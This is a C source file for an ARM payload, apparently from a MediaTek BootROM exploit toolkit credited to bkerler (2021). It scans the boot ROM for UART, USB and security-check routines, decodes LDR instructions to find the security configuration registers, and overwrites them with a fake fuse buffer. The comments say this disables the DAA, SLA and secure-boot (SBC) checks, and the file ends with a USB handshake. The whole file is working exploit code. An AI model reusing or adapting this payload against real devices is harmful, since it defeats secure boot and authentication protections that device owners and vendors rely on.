#include <stdint.h>

volatile uint8_t fusebuffer[0x100]={0};
volatile uint32_t *uart_reg0 = (volatile uint32_t*)0x0;
volatile uint32_t *uart_reg1 = (volatile uint32_t*)0x0;
void (*send_usb_response)(int, int, int) = (void*)0x0;
int (*usbdl_put_data)() = (void*)0x0;
int (*usbdl_get_data)() = (void*)0x0;
static const uint32_t brom_bases[3] = {0, 0x00400000, 0x48000000};

//#define DEBUG 1

#ifdef DEBUG
void hex_dump(const void* data, uint32_t size) {
    static const char hex[] = "0123456789ABCDEF";
    uint32_t i, j;
    for (i = 0; i < size; ++i) {
        _putchar(hex[(((unsigned char*)data)[i] >>  4) & 0xf]);
        _putchar(hex[((unsigned char*)data)[i] & 0xf]);
        //printf("%02X ", ((unsigned char*)data)[i]);
        if ((i+1) % 8 == 0 || i+1 == size) {
            print(" ");
            if ((i+1) % 16 == 0) {
                print("\n");
            } else if (i+1 == size) {
                if ((i+1) % 16 <= 8) {
                    print(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    print("   ");
                }
                print("\n");
            }
        }
    }
}
#endif

void low_uart_put(int ch) {
    while ( !((*uart_reg0) & 0x20) )
    {}
    *uart_reg1 = ch;
}

void _putchar(char character)
{
    if (character == '\n')
        low_uart_put('\r');
    low_uart_put(character);
}

int print(char* s){
    char c = s[0];
    int i = 0;
    while(c){
        _putchar(c);
        c = s[++i];
    }
    return i;
}

uint32_t searchfunc(uint32_t startoffset, uint32_t endoffset, const uint16_t *pattern, uint32_t patternsize) {
    uint32_t matched = 0;
    for (uint32_t offset = startoffset; offset < endoffset; offset += 2) {
        for (uint32_t i = 0; i < patternsize; i++) {
            if (((uint16_t *)offset)[i] != pattern[i]) {
                matched = 0;
                break;
            }
            if (++matched == patternsize) return offset;
        }
    }
    return 0;
}

uint32_t ldr_lit(const uint32_t curpc, uint16_t instr, uint8_t *Rt) {
    //#LDR (literal), LDR R1, =SEC_REG
    uint8_t imm8=instr&0xFF;
    (*Rt) = (instr >> 8) & 7;
    uint32_t pc=(((uint32_t)curpc) / 4 * 4);
    return (pc + (imm8 * 4) + 4);
}

void ldr_imm(uint16_t instr, uint8_t *simm5, uint8_t *sRt, uint8_t *sRn) {
    (*simm5) = (instr >> 6) & 0x1F;
    (*sRt) = (instr) & 0x7;
    (*sRn)= (instr >> 3) & 0x7;
}

__attribute__ ((section(".text.main"))) int main() {

    uint16_t instr=0;
    uint16_t opcode=0;
    uint8_t simm5;
    uint8_t sRt;
    uint8_t sRm;

    int i=0;
    uint32_t offs1=0;
    uint32_t bromstart=0;
    uint32_t bromend=0x10000;
    /* Let's find the brom base and usbdl_put_dword func */
    /*static const uint16_t senddwordptr[4]={0xE92D,0x4FF8,0x4680,0x468A};
    for (i =  0; i < 3; ++i) {
        offs1=searchfunc(brom_bases[i] + 0x100,brom_bases[i] + 0x10000,senddwordptr,4);
        if (offs1!=0){
            offs2=searchfunc(offs1+2,brom_bases[i] + 0x10000,senddwordptr,4);
            if (offs2!=0) break;
            }
    }

    usbdl_put_dword=(void*)(offs2|1);
    */

    /* Time to find the brom base and set the watchdog before it's game over */
    /*for (i =  0; i < 3; ++i) {
        bromstart=brom_bases[i]+0x100;
        bromend=brom_bases[i]+0x10000;
        static const uint16_t wdts[3]={0xF641,0x1071,0x6088};
        offs1=searchfunc(bromstart,bromend,wdts,3);
        if (offs1!=0){
            break;
        }
    }
    *wdt=0x22000064;*/
    
    /*i=0;
    bromstart=brom_bases[i]+0x100;
    bromend=brom_bases[i]+0x10000;
    */

    /* A warm welcome to uart */
    static const uint16_t uartb[4]={0x5F31,0x4E45,0x0F93,0x000E};
    uint32_t uartbase=0;
    uint32_t startpos=0;
    int basedet=0;
    for (i =  0; i < 3; ++i) {
        bromstart=brom_bases[i]+0x100;
        bromend=brom_bases[i]+0x10000;
        offs1=-1;
        startpos=bromstart;
        while (offs1!=0){
            offs1 = searchfunc(startpos,bromend,uartb,4);
            if (offs1!=0) {
                    uartbase=((uint32_t*)(offs1+0x8))[0]&0xFFFFFFFF;
                    uart_reg0 = (volatile uint32_t*)(uartbase+0x14);
                    uart_reg1 = (volatile uint32_t*)(uartbase);
                    basedet=1;
                    break;
            }
            startpos=offs1+2;
        }
        if (basedet==1) break;
    }

    /* Let's dance with send_usb_response */
    static const uint16_t sur1a[2]={0xB530,0x2300};
    static const uint16_t sur1b[3]={0x2808,0xD00F,0x2807};
    static const uint16_t sur2[6]={0xB510,0x2400,0xF04F,0x5389,0x2803,0xD006};
    static const uint16_t sur3[6]={0xB510,0x4B72,0x2400,0x2803,0xD006,0x2802};
    uint32_t sfo=searchfunc(bromstart,bromend,sur1a,2);
    if (sfo!=0x0) {
        uint32_t sfo2=searchfunc(sfo+6,sfo+12,sur1b,3);
        if (sfo2!=sfo+6){
            sfo=0;
        }
    }
    if (sfo==0) {
        sfo = searchfunc(bromstart, bromend, sur2,6);
    }
    if (sfo==0){
        sfo = searchfunc(bromstart, bromend, sur3, 6);
    }
    if (sfo!=0){
        send_usb_response = (void *)(sfo|1);
    }
    #ifdef DEBUG
    if (sfo == 0x0) {
        print("F:sur\n");
        return 0;
    }
    else{
        print("A:sur\n");
        hex_dump(&send_usb_response,4);
    }
    #endif

    /* usbdl_put_data here we are ... */
    static const uint16_t sdd[3]={0xB510,0x4A06,0x68D4};
    usbdl_put_data=(void*)(searchfunc(bromstart, bromend, sdd, 3) | 1);
    #ifdef DEBUG
    if ((int)usbdl_put_data == 1){
        print("F:upd\n");
        return 0;
    }
    else{
        print("A:upd\n");
        hex_dump(&usbdl_put_data,4);
    }
    #endif

    /* usbdl_get_data is a mess .... */
    static const uint16_t rcd2[2]={0xE92D,0x47F0};
    startpos=bromstart;
    offs1=-1;
    while (offs1 != 0) {
        offs1 = searchfunc(startpos, bromend, rcd2, 2);
        uint8_t* posc=(uint8_t *)offs1;
        if (((uint8_t)posc[7] == (uint8_t) 0x46) && ((uint8_t)posc[8] == (uint8_t) 0x92)){
            usbdl_get_data = (void *) ((uint32_t)offs1 | 1);
            break;
        }
        startpos = offs1 + 2;
    }
    #ifdef DEBUG
    if (!usbdl_get_data){
        print("F:ugd\n");
        return 0;
    }
    else{
        print("A:ugd\n");
        hex_dump(&usbdl_get_data,4);
    }
    #endif


    /* sbc to go, please .... */
    static const uint16_t sbcr[1]={0xB510};
    uint32_t sbc=0;
    offs1=-1;
    startpos=bromstart;
    while (offs1!=0){
        offs1 = searchfunc(startpos,bromend,sbcr,1);
        uint8_t* posc=(uint8_t *)offs1;
        if ((uint8_t)posc[3]==(uint8_t)0xF0) {
            if (((uint8_t)posc[7]==(uint8_t)0x46) || ((uint8_t)posc[7]==(uint8_t)0x49)){
                sbc=(uint32_t)offs1;
                break;
            }
        }
        startpos=offs1+2;
    }
    #ifdef DEBUG
    if (!sbc){
        print("F:sbc");
        return 0;
    }
    else{
        print("A:sbc\n");
        hex_dump(&sbc,4);
    }
    #endif


    /* sbc to go, please .... */
    volatile int mode=-1;
    volatile uint32_t *SEC_REG2=0;
    volatile uint32_t *SEC_REG=0x0;
    volatile uint32_t SEC_ROFFSET=0x0;
    volatile uint32_t SEC_ROFFSET2=0x0;
    volatile uint32_t SEC_OFFSET=0x40;
    uint32_t offset=0x0;
    uint8_t Rt=0;
    for (i=0;i<0x100;i+=2) {
        instr=((uint16_t*)((uint32_t)sbc+i))[0];
        opcode=((instr>>11)&0x1F);
        if (opcode==9){
            offset=((uint32_t*)(ldr_lit((uint32_t)sbc+i, instr, &Rt)))[0];
            SEC_ROFFSET=offset;
        }
        if (SEC_ROFFSET!=0){
            if (opcode==0xD){
                // LDR (Immediate), LDR R1, [R1, #SEC_OFFSET]
                ldr_imm(instr, &simm5, &sRt, &sRm);
                if (Rt==sRt && simm5!=0){
                    SEC_OFFSET=(uint32_t)simm5*4;
                    if (SEC_OFFSET==0x40){
                        mode=0;
                        break;
                    }
                    else {
                        SEC_ROFFSET+=SEC_OFFSET;
                    }
                    
                }
            }
            else if (instr==0x1040)
            {
                mode=0;
                break;
            }
            else if (instr==0x10BD)
            {
                break;
            }

        }
    }
    int cnt=0;
    if (mode!=0){
        SEC_ROFFSET=0;
        uint32_t sbc_intern=(uint32_t)(sbc-0xE);
        for (i=0;i<0x20;i+=2){
            instr=((uint16_t*)((uint32_t)sbc_intern+i))[0];
            opcode=((instr>>11)&0x1F);
            if (opcode==9){
                offset=((uint32_t*)(ldr_lit((uint32_t)sbc_intern+i, instr, &Rt)))[0];
                SEC_ROFFSET=offset;
            }
            if (SEC_ROFFSET!=0) {
                if (opcode == 0xD) {
                    // LDR (Immediate), LDR R1, [R1, #SEC_OFFSET]
                    ldr_imm(instr, &simm5, &sRt, &sRm);
                    if (sRm==Rt){
                        if (cnt==0){
                            SEC_ROFFSET=offset+(simm5*4);
                        }
                        else {
                            SEC_ROFFSET2=offset+(simm5*4);
                            mode=1;
                            break;
                        }
                        cnt++;
                    }
                }
            }
        }
    }
    
    //usbdl_put_data(&wdt,4);
    //usbdl_put_data(&uart_reg0,4);
    //usbdl_put_data(&uart_reg1,4);
    //usbdl_put_data(&send_usb_response,4);
    //usbdl_put_data(&usbdl_put_data,4);
    //usbdl_put_data(&usbdl_get_data,4);
    //usbdl_put_data(&mode,4);
    print("MTK-patch (c) bkerler 2021\n");
    //This is so we don't get a USB-Timeout
    #ifdef DEBUG
    print("R:USB\n");
    #endif
    send_usb_response(1,0,1);
    uint32_t ack=0xA4A3A2A1;
    #ifdef DEBUG
    print("S:ACK\n");
    #endif

    if (mode==-1){
        usbdl_put_data(&mode,4);
    }
    else {
        usbdl_put_data(&ack,4);
    }
    #ifdef DEBUG
    print("A:mode\n");
    hex_dump(&mode,4);
    print("A:SEC_ROFFSET\n");
    hex_dump(&SEC_ROFFSET,4);
    print("A:SEC_ROFFSET2\n");
    hex_dump(&SEC_ROFFSET2,4);
    #endif
    print("fusebuffer\n");
    //usbdl_put_data(&sbc,4);
    //usbdl_put_data(&SEC_ROFFSET,4);
    //usbdl_put_data(&SEC_ROFFSET2,4);
    //usbdl_put_data(&offset,4);
    //ack=SEC_REG2;

    if (mode!=-1){
        SEC_REG=(volatile uint32_t *)SEC_ROFFSET;
        fusebuffer[0] = 0xB;
        fusebuffer[SEC_OFFSET] = 0xB; // 1026D4+0x40, << 0x1e < 0x0 (DAA),  & << 0x1f !=0 (SLA), << 0x1c < 0x0 (SBC)
        *(uint32_t*)SEC_REG=(volatile uint32_t*)&fusebuffer; // 1026D4, !=0 (SLA, SBC)
    }

    if (mode==1){
        SEC_REG2=(volatile uint32_t *)SEC_ROFFSET2;
        SEC_REG2[0]=0xB;
    }

    //invalidate icache
    asm volatile ("mcr p15, 0, %0, c7, c5, 0" : : "r" (0));

    const char sequence[] = {0xA0, 0x0A, 0x50, 0x05};
    unsigned int index = 0;
    unsigned char hs = 0;

    print("W:HSK\n");
    do {
        while ( ((*uart_reg0) & 1) ) {}
        while ( 1 ) {
            usbdl_get_data(&hs, 1);
            if(sequence[index] == hs) break;
            index = 0;
            print("\nF:HSK\n");
        }
        hs = ~hs;
        usbdl_put_data(&hs, 1);
        index += 1;
        print(".");
    } while(index != 4);

    print("\nA:HSK\n");
 
    return 0;

}